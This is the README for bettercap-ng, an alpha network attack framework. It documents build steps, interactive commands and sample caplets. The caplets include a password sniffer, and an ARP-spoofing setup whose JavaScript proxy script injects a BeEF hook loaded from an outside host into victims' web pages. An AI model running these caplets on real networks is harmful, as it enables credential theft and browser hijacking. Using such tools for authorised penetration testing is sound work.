<p align="center">
  <img alt="BetterCap" src="https://www.bettercap.org/assets/logo.png" height="140" />
  <h3 align="center">bettercap-ng</h3>
  <p align="center">
    <a href="https://github.com/evilsocket/bettercap-ng/releases/latest"><img alt="Release" src="https://img.shields.io/github/release/evilsocket/bettercap-ng.svg?style=flat-square"></a>
    <a href="/LICENSE"><img alt="Software License" src="https://img.shields.io/badge/license-GPL3-brightgreen.svg?style=flat-square"></a>
    <a href="https://travis-ci.org/evilsocket/bettercap-ng"><img alt="Travis" src="https://img.shields.io/travis/evilsocket/bettercap-ng/master.svg?style=flat-square"></a>
    <a href="https://goreportcard.com/report/github.com/evilsocket/bettercap-ng"><img alt="Go Report Card" src="https://goreportcard.com/badge/github.com/evilsocket/bettercap-ng?style=flat-square&fuckgithubcache=1"></a>
  </p>
</p>

---

This is a WIP of the new version of [bettercap](https://github.com/evilsocket/bettercap), very alpha, **do not use** ... or do, whatever.

## Compiling

Make sure you have a correctly configured Go >= 1.8 environment and the `libpcap-dev` package installed for your system, then:

    git clone https://github.com/evilsocket/bettercap-ng $GOPATH/src/github.com/evilsocket/bettercap-ng
    cd $GOPATH/src/github.com/evilsocket/bettercap-ng
    make deps
    make

To show the command line options:

    # sudo ./bettercap-ng -h
    
    Usage of ./bettercap-ng:
      -caplet string
            Read commands from this file and execute them in the interactive session.
      -debug
            Print debug messages.
      -eval string
            Run a command, used to set variables via command line.
      -iface string
            Network interface to bind to.
      -no-history
            Disable history file.
      -silent
            Suppress all logs which are not errors.

## Caplets

Interactive sessions can be scripted with `.cap` files, or `caplets`, the following are a few basic examples, look the `caplets` folder for more.

#### caplets/simple-password-sniffer.cap

Simple password sniffer.

```sh
# keep reading arp table for network mapping
net.recon on
# setup a regular expression for packet payloads
set net.sniffer.regexp .*password=.+
# set the sniffer output file
set net.sniffer.output passwords.pcap
# start the sniffer
net.sniffer on
```

#### caplets/rest-api.cap

Start a rest API.

```sh
# change these!
set api.rest.username bcap
set api.rest.password bcap
# set api.rest.port 8082

# actively probe network for new hosts
net.probe on
net.recon on

# enjoy /api/session and /api/events
api.rest on
```

Get information about the current session:

    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/session

Execute a command in the current interactive session:

    curl -k --user bcap:bcap https://bettercap-ip:8083/api/session -H "Content-Type: application/json" -X POST -d '{"cmd":"net.probe on"}'

Get last 50 events:

    curl -k --user bpcap:bcap https://bettercap-ip:8083/api/events?n=50

Clear events:

    curl -k --user bpcap:bcap -X DELETE https://bettercap-ip:8083/api/events

<center>
    <img src="https://pbs.twimg.com/media/DTAreSCX4AAXX6v.jpg:large" width="100%"/>
</center>

#### caplets/beef-inject.cap

Use a proxy script to inject a BEEF javascript hook:

```sh
# targeting the whole subnet by default, to make it selective:
#
#   sudo ./bettercap-ng -caplet caplets/beef-active.cap -eval "set arp.spoof.targets 192.168.1.64"

# inject beef hook
set http.proxy.script caplets/beef-inject.js
# keep reading arp table for network mapping
net.recon on
# redirect http traffic to a proxy
http.proxy on
# wait for everything to start properly
sleep 1
# make sure probing is off as it conflicts with arp spoofing
arp.spoof on
```

The `caplets/beef.inject.js` proxy script file:

```javascript
function onLoad() {
    console.log( "BeefInject loaded." );
    console.log("targets: " + env['arp.spoof.targets']);
}

function onResponse(req, res) {
    if( res.ContentType.indexOf('text/html') == 0 ){
        var body = res.ReadBody();
        if( body.indexOf('</head>') != -1 ) {
            res.Body = body.replace( 
                '</head>', 
                '<script type="text/javascript" src="http://your-beef-box:3000/hook.js"></script></head>' 
            ); 
            res.Updated();
        }
    }
}
```

## Interactive Mode

Interactive mode allows you to start and stop modules manually on the fly, change options and apply new firewall rules on the fly, the basic commands are:

| Command | Description |
| ------- | ------------|
| help | Display list of available commands. |
| active | Show information about active modules. | 
| exit | Close the session and exit. |
| sleep SECONDS | Sleep for the given amount of seconds. |
| get NAME | Get the value of variable NAME, use * for all. |
| set NAME VALUE | Set the VALUE of variable NAME. |

For instance you can view a list of declared variables with `get *` and set new ones, for example `set some.new.variable some-value`, for a list of every module and its parameters, issue the `help` command:

    192.168.1.0/24 > 192.168.1.17  » help

    Basic commands:

                      help : Display list of available commands.
                    active : Show information about active modules.
                      exit : Close the session and exit.
             sleep SECONDS : Sleep for the given amount of seconds.
                  get NAME : Get the value of variable NAME, use * for all.
            set NAME VALUE : Set the VALUE of variable NAME.

    ARP Spoofer [not active]
    Keep spoofing selected hosts on the network.

              arp.spoof on : Start ARP spoofer.
             arp.spoof off : Stop ARP spoofer.

      Parameters

         arp.spoof.targets : IP addresses to spoof. (default=<entire subnet>)


    Events Stream [active]
    Print events as a continuous stream.

          events.stream on : Start events stream.
         events.stream off : Stop events stream.
              events.clear : Clear events stream.

    HTTP Proxy [not active]
    A full featured HTTP proxy that can be used to inject malicious contents into webpages, all HTTP traffic will be redirected to it.

             http.proxy on : Start HTTP proxy.
            http.proxy off : Stop HTTP proxy.

      Parameters

                 http.port : HTTP port to redirect when the proxy is activated. (default=80)
        http.proxy.address : Address to bind the HTTP proxy to. (default=<interface address>)
           http.proxy.port : Port to bind the HTTP proxy to. (default=8080)
         http.proxy.script : Path of a proxy JS script. (default=)


    Network Prober [not active]
    Keep probing for new hosts on the network by sending dummy UDP packets to every possible IP on the subnet.

              net.probe on : Start network hosts probing in background.
             net.probe off : Stop network hosts probing in background.

      Parameters

        net.probe.throttle : If greater than 0, probe packets will be throttled by this value in milliseconds. (default=10)


    Network Recon [not active]
    Read periodically the ARP cache in order to monitor for new hosts on the network.

              net.recon on : Start network hosts discovery.
             net.recon off : Stop network hosts discovery.
                  net.show : Show current hosts list.

    Network Sniffer [not active]
    Sniff packets from the network.

         net.sniffer stats : Print sniffer session configuration and statistics.
            net.sniffer on : Start network sniffer in background.
           net.sniffer off : Stop network sniffer in background.

      Parameters

       net.sniffer.verbose : Print captured packets to screen. (default=true)
         net.sniffer.local : If true it will consider packets from/to this computer, otherwise it will skip them. (default=false)
        net.sniffer.filter : BPF filter for the sniffer. (default=not arp)
        net.sniffer.regexp : If filled, only packets matching this regular expression will be considered. (default=)
        net.sniffer.output : If set, the sniffer will write captured packets to this file. (default=)


    REST API [not active]
    Expose a RESTful API.

               api.rest on : Start REST API server.
              api.rest off : Stop REST API server.

      Parameters

          api.rest.address : Address to bind the API REST server to. (default=<interface address>)
             api.rest.port : Port to bind the API REST server to. (default=8083)
         api.rest.username : API authentication username. (default=)
      api.rest.certificate : API TLS certificate. (default=~/.bettercap-ng.api.rest.certificate.pem)
              api.rest.key : API TLS key (default=~/.bettercap-ng.api.rest.key.pem)
         api.rest.password : API authentication password. (default=)

## License

`bettercap` and `bettercap-ng` are made with ♥  by [Simone Margaritelli](https://www.evilsocket.net/) and they're released under the GPL 3 license.
